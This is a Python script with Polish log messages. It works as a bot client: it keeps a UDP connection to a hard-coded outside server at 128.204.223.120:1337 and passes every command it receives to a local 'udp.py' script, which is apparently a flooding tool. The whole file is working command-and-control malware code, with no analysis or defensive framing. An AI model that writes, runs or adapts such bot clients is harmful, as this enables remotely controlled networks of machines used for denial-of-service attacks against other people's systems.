import socket
import subprocess
import threading
import time

SERVER_IP = "128.204.223.120"
SERVER_PORT = 1337
RECONNECT_INTERVAL = 5

client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
client_socket.settimeout(10)

connected = False

def connect():
    global connected
    while not connected:
        try:
            print(f"[RECONNECT] Wysyłam hello do {SERVER_IP}:{SERVER_PORT}...")
            client_socket.sendto(b"Hello from client", (SERVER_IP, SERVER_PORT))
            connected = True
            print("[STATUS] Połączono z serwerem.")
        except Exception as e:
            print(f"[ERROR] Nie udało się połączyć: {e}")
            time.sleep(RECONNECT_INTERVAL)

def listen():
    global connected
    while True:
        try:
            data, _ = client_socket.recvfrom(1024)
            command = data.decode().strip()
            print(f"[RECV] Komenda: {command}")
            args = command.split()
            if args:
                subprocess.Popen(["python3", "udp.py"] + args)
        except socket.timeout:
            print("[TIMEOUT] Brak danych, próbuję ponownie połączyć.")
            connected = False
            connect()
        except Exception as e:
            print(f"[ERROR] Problem podczas odbierania danych: {e}")
            connected = False
            connect()

connect()
threading.Thread(target=listen, daemon=True).start()

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("Zamykanie klienta.")
